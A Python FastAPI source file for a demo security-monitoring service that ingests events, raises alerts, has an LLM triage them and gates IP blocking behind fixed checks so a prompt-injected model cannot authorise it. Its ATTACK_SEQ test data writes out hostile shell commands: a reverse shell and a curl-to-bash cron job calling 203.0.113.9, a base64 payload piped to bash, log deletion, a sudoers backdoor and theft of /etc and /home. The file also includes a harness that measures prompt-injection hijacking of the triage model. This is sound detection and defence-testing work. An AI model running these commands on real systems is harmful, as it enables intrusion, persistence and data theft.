"""Aegis-SOC API — a single Cloud Run service hosting ingest, detection, triage
and the operator console.

Deliberate 4-day scope decisions:
  * one service, not three: fewer deploy steps, fewer failure modes in a live demo
  * triage runs inline so an alert arrives already analysed on screen
  * storage is pluggable (SQLite locally, Firestore on Cloud Run)
"""
from __future__ import annotations

import os
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Annotated

from fastapi import Body, FastAPI, HTTPException, Query
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

from . import detect
from . import triage as triage_mod
from .detect import RULES, STATE
from .schema import Alert, Event
from .store import get_store, new_alert_id

BASE = Path(__file__).parent
app = FastAPI(title="Aegis-SOC", version="1.0.0", docs_url="/api/docs")
app.mount("/static", StaticFiles(directory=BASE / "static"), name="static")

AUTO_TRIAGE = os.getenv("AUTO_TRIAGE", "1") == "1"
DEDUPE_SECONDS = int(os.getenv("DEDUPE_SECONDS", "300"))


# --------------------------------------------------------------------------- #
# Pipeline
# --------------------------------------------------------------------------- #
def _fingerprint(cand: dict, ev: Event) -> str:
    return "|".join([cand["rule_id"], ev.host or "-", ev.user or "-", ev.src_ip or "-"])


def process_event(raw: dict, auto_triage: bool = True) -> list[dict]:
    """One event in → zero or one alert out. Returns created alerts."""
    try:
        ev = Event.from_raw(raw)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"invalid event: {exc}") from exc

    STATE.record(ev)
    candidates = detect.detect(ev)
    fused_list = detect.fuse(ev, candidates)
    if not fused_list:
        return []

    store = get_store()
    created: list[dict] = []
    for fused in fused_list:
        fp = _fingerprint(fused, ev)
        if fp in store.recent_fingerprints(DEDUPE_SECONDS, ref_ts=ev.ts):
            continue  # dedupe: same rule+entity inside the window

        alert = Alert(
            id=new_alert_id(), ts=ev.ts, fingerprint=fp,
            rule_id=fused["rule_id"], title=fused["title"],
            severity=fused["severity"], technique=fused["technique"],
            why=fused["why"], score=fused["score"], sources=fused["sources"], event=ev,
        )
        store.add_alert(alert)

        payload = {
            "id": alert.id, "title": alert.title, "severity": alert.severity,
            "technique": alert.technique, "score": alert.score,
            "rule_id": alert.rule_id, "sources": alert.sources,
            "why": fused["why"], "host": ev.host, "user": ev.user,
            "src_ip": ev.src_ip, "ts": alert.ts.isoformat(),
        }

        if auto_triage:
            try:
                result = triage_mod.triage(payload | {"event": ev}, defenses=True)
                store.set_triage(alert.id, result)
                payload["triage"] = result
            except Exception as exc:  # never let triage break ingestion
                payload["triage_error"] = str(exc)

        created.append(payload)

    return created


# --------------------------------------------------------------------------- #
# Ingest
# --------------------------------------------------------------------------- #
@app.post("/ingest")
def ingest(body: Annotated[dict | list, Body()]) -> dict:
    """Accepts one event, a list of events, or {"events": [...]}."""
    if isinstance(body, dict) and "events" in body:
        events = body["events"]
    elif isinstance(body, list):
        events = body
    else:
        events = [body]

    created: list[dict] = []
    for raw in events:
        created.extend(process_event(raw, auto_triage=AUTO_TRIAGE))
    return {"received": len(events), "alerts": len(created),
            "alert_ids": [a["id"] for a in created]}


# --------------------------------------------------------------------------- #
# Read APIs
# --------------------------------------------------------------------------- #
@app.get("/api/alerts")
def list_alerts(limit: int = Query(100, ge=1, le=500)) -> dict:
    return {"alerts": get_store().list_alerts(limit)}


@app.get("/api/alerts/{alert_id}")
def get_alert(alert_id: str) -> dict:
    a = get_store().get_alert(alert_id)
    if not a:
        raise HTTPException(404, "alert not found")
    return a


@app.get("/api/stats")
def stats() -> dict:
    s = get_store().stats()
    s["rules"] = len(RULES)
    s["techniques"] = len(triage_mod.TECHNIQUES)
    s["store"] = os.getenv("STORE", "sqlite")
    return s


@app.get("/api/health")
def health() -> dict:
    return {
        "status": "ok",
        "llm_mode": "gemini" if os.getenv("GEMINI_API_KEY") else "mock (no API key)",
        "model": os.getenv("GEMINI_MODEL", "gemini-flash-latest"),
        "auto_triage": AUTO_TRIAGE,
        "store": os.getenv("STORE", "sqlite"),
        "rules": len(RULES),
        "baseline_processes": len(detect.BASELINE.process_count),
        "baseline_events": detect.BASELINE.total,
        "time": datetime.now(UTC).isoformat(),
    }


@app.post("/api/alerts/{alert_id}/triage")
def retriage(alert_id: str, defenses: bool = True) -> dict:
    store = get_store()
    a = store.get_alert(alert_id)
    if not a:
        raise HTTPException(404, "alert not found")
    ev = Event(**a["event"])
    payload = {**a, "event": ev}
    result = triage_mod.triage(payload, defenses=defenses)
    store.set_triage(alert_id, result)
    return result


# --------------------------------------------------------------------------- #
# Containment — D4 lives here
# --------------------------------------------------------------------------- #
@app.post("/api/alerts/{alert_id}/block")
def block(alert_id: str) -> dict:
    """Deterministic policy gate. The LLM's opinion is NOT an input to this
    decision — that is defence D4: a prompt-injected model still cannot block."""
    store = get_store()
    a = store.get_alert(alert_id)
    if not a:
        raise HTTPException(404, "alert not found")

    checks = {
        "severity_high_or_critical": a["severity"] in ("high", "critical"),
        "confidence_at_least_0.80": float(a.get("score", 0)) >= 0.80,
        "technique_identified": bool(a.get("technique")),
        "not_anomaly_only": a.get("rule_id") != "ANOM",
        "source_ip_present": bool(a.get("src_ip")),
    }
    allowed = all(checks.values())
    llm_verdict = (a.get("triage") or {}).get("verdict")
    decision = {
        "allowed": allowed, "checks": checks,
        "llm_verdict_ignored_for_authorisation": llm_verdict,
        "action": None,
    }
    if allowed:
        decision["action"] = {
            "type": "edge_block", "provider": "cloud_armor_or_iptables",
            "target": a["src_ip"],
            "rule": f"deny ip {a['src_ip']} # aegis-{a['id']}",
            "applied": os.getenv("APPLY_BLOCKS", "simulated"),
        }
        store.set_status(alert_id, "blocked")
    return decision


# --------------------------------------------------------------------------- #
# Demo helpers
# --------------------------------------------------------------------------- #
ATTACK_SEQ: list[dict] = [
    {"event_type": "auth", "host": "web-01", "user": "root", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for root"},
    {"event_type": "auth", "host": "web-01", "user": "root", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for root"},
    {"event_type": "auth", "host": "web-01", "user": "admin", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for admin"},
    {"event_type": "auth", "host": "web-01", "user": "oracle", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for oracle"},
    {"event_type": "auth", "host": "web-01", "user": "postgres", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for postgres"},
    {"event_type": "auth", "host": "web-01", "user": "root", "src_ip": "203.0.113.9",
     "status": "failure", "message": "Failed password for root"},
    {"event_type": "auth", "host": "web-01", "user": "root", "src_ip": "203.0.113.9",
     "status": "success", "message": "Accepted password for root"},
    {"event_type": "process", "host": "web-01", "user": "root",
     "process": "useradd", "cmdline": "/usr/sbin/useradd -m -s /bin/bash svcbackup",
     "src_ip": "203.0.113.9"},
    {"event_type": "file", "host": "web-01", "user": "root", "process": "tee",
     "path": "/root/.ssh/authorized_keys",
     "cmdline": "echo 'ssh-ed25519 AAAAC3... attacker@c2' >> /root/.ssh/authorized_keys"},
    {"event_type": "file", "host": "web-01", "user": "root", "process": "sh",
     "path": "/etc/cron.d/updater",
     "cmdline": "echo '* * * * * root curl -s http://203.0.113.9/u.sh | bash' > /etc/cron.d/updater"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "bash",
     "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "bash",
     "cmdline": "echo 'cHduZWQ=' | base64 -d | bash"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "curl",
     "cmdline": "curl -s http://203.0.113.9/x.sh -o /tmp/x && chmod +x /tmp/x && /tmp/x"},
    {"event_type": "file", "host": "web-01", "user": "root", "process": "rm",
     "path": "/var/log/auth.log", "cmdline": "rm -rf /var/log/auth.log"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "sh",
     "cmdline": "echo 'svcbackup ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "tar",
     "cmdline": "tar -czf /tmp/loot.tgz /etc /home"},
]


@app.post("/api/simulate/attack")
def simulate_attack() -> dict:
    now = datetime.now(UTC)
    created = []
    for i, ev in enumerate(ATTACK_SEQ):
        ev = {**ev, "ts": (now + timedelta(milliseconds=400 * i)).isoformat()}
        created.extend(process_event(ev, auto_triage=AUTO_TRIAGE))
    return {"sent": len(ATTACK_SEQ), "alerts": len(created), "payloads": created}


@app.post("/api/simulate/injection")
def simulate_injection() -> dict:
    """Runs the payload corpus through triage with defences off and on."""
    from .injections import PAYLOADS

    def run(defenses: bool) -> dict:
        rows = []
        for p in PAYLOADS:
            alert = {
                "id": "sim", "rule_id": "R003", "title": "Local account creation",
                "technique": "T1136.001", "severity": "high", "score": 0.9,
                "sources": ["R003"], "why": "useradd matched",
                "event": Event(
                    event_type="process", host="web-01", user=p.get("user", "root"),
                    process="useradd", cmdline=p["payload"], src_ip="203.0.113.9",
                    user_agent=p.get("user_agent"),
                ),
            }
            r = triage_mod.triage(alert, defenses=defenses)
            rows.append({
                "id": p["id"], "payload": p["payload"][:90],
                "verdict": r["verdict"], "severity": r["severity"],
                "hijacked": r["verdict"] == "false_positive",
                "critic": r["_meta"]["critic"],
                "mode": r["_meta"]["mode"], "simulated": r["_meta"]["simulated"],
            })
        asr = sum(1 for x in rows if x["hijacked"]) / max(len(rows), 1)
        return {"defenses": defenses, "asr": round(asr, 3),
                "hijacked": sum(1 for x in rows if x["hijacked"]),
                "total": len(rows), "rows": rows}

    off = run(False)
    on = run(True)
    return {"payloads": len(PAYLOADS), "without_defenses": off, "with_defenses": on,
            "mode": off["rows"][0]["mode"] if off["rows"] else "unknown"}


@app.post("/api/reset")
def reset() -> dict:
    store = get_store()
    if hasattr(store, "_db"):  # sqlite
        store._db.execute("DELETE FROM alerts")
        store._db.commit()
    else:
        for a in store.list_alerts(500):
            try:
                store._client.collection(store.COLL).document(a["id"]).delete()
            except Exception:
                pass
    with STATE.lock:
        STATE.auth_fail.clear()
        STATE.success_after_fail.clear()
    return {"reset": True}


# --------------------------------------------------------------------------- #
# UI
# --------------------------------------------------------------------------- #
@app.get("/")
def index():
    return FileResponse(BASE / "static" / "index.html")


@app.exception_handler(Exception)
async def unhandled(request, exc):  # pragma: no cover
    return JSONResponse(status_code=500, content={"error": str(exc)})
